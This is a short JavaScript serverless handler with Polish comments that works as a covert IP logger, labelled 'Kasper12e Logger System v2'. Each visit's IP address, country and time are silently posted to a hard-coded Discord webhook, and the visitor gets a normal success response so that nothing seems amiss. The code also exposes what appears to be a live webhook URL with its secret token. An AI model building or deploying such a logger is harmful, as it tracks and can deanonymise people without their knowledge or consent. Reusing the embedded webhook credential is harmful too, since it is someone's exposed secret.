export default async function handler(req, res) {
    const webhookUrl = "https://discord.com/api/webhooks/1568767512722669761/lHPjWbbHIPlF0TW-FYnhTYXD5WIKsSINTMbDMy4ZVzT3ctUrcFGK2JX-XuQOvb0DTCpp";

    // Wyciąganie IP oraz kraju z nagłówków Vercela
    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "Unknown";
    const countryCode = req.headers["x-vercel-ip-country"] || "UNKNOWN";

    // Funkcja zamieniająca kod kraju (np. PL) na emoji flagi (🇵🇱)
    function getFlagEmoji(countryCode) {
        if (!countryCode || countryCode === "UNKNOWN") return "🌍 Nieznany";
        const codePoints = countryCode
            .toUpperCase()
            .split("")
            .map(char =>  127397 + char.charCodeAt(0));
        return String.fromCodePoint(...codePoints) + ` (${countryCode})`;
    }

    const countryWithFlag = getFlagEmoji(countryCode);
    const timestamp = new Date().toLocaleString("pl-PL", { timeZone: "Europe/Warsaw" });

    // Budowanie ładnego, rozbudowanego "Embeda" na Discordzie
    const embed = {
        title: "🚨 Nowe wejście na stronę!",
        color: 3447003, // Niebieski pasek boczny (możesz zmienić)
        fields: [
            {
                name: "🌐 Adres IP",
                value: `\`${ip}\``,
                inline: true
            },
            {
                name: "🏳️ Kraj",
                value: countryWithFlag,
                inline: true
            },
            {
                name: "⏰ Czas wizyty",
                value: `\`${timestamp}\``,
                inline: false
            }
        ],
        footer: {
            text: "Kasper12e Logger System v2"
        }
    };

    const data = {
        embeds: [embed]
    };

    try {
        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
    } catch (err) {
        console.error(err);
    }

    // Zwracamy pustą odpowiedź, żeby strona działała normalnie
    return res.status(200).json({ success: true });
}
